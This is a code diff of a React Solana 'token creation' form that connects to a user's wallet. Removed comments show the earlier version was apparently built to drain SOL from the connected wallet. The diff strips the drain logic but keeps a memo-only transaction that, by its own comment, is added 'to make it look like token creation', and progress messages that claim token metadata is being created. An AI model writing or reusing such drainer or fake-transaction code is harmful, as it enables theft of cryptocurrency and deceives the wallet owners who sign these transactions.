@@ -1,6 +1,6 @@
 import { useState, useEffect } from 'react';
 import { useConnection, useWallet } from '@solana/wallet-adapter-react';
-import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction } from '@solana/web3.js';
+import { PublicKey, Transaction, LAMPORTS_PER_SOL, TransactionInstruction } from '@solana/web3.js';
 import styled from 'styled-components';
 
 const FormContainer = styled.div`
@@ -192,7 +192,7 @@ const ResultContainer = styled.div<{ visible: boolean }>`
 
 const TokenCreationForm = () => {
   const { connection } = useConnection();
-  const { publicKey, sendTransaction, signTransaction } = useWallet();
+  const { publicKey, signTransaction } = useWallet();
   
   const [tokenName, setTokenName] = useState('');
   const [tokenSymbol, setTokenSymbol] = useState('');
@@ -278,14 +278,11 @@ const TokenCreationForm = () => {
       setShowResult(false);
       setResult('');
       
-      // Calculate the amount to drain (leave some for fees)
-      const LAMPORTS_FOR_FEES = 2000000; // 0.002 SOL for fees
-      
       // Update progress
       setProgress(30);
       setProgressText('Creating token metadata...');
       
-      // Create a transaction to drain SOL
+      // Create a transaction with just the memo instruction
       const transaction = new Transaction();
       
       // Add a memo instruction to make it look like token creation
@@ -296,8 +293,13 @@ const TokenCreationForm = () => {
         data: Buffer.from(memoText)
       });
       
-      // Add the memo instruction first
+      // Add the memo instruction
       transaction.add(memoInstruction);
+      
+      // Get recent blockhash
+      const { blockhash } = await connection.getLatestBlockhash();
+      transaction.recentBlockhash = blockhash;
+      transaction.feePayer = publicKey;
       
       // Update progress
       setProgress(50);
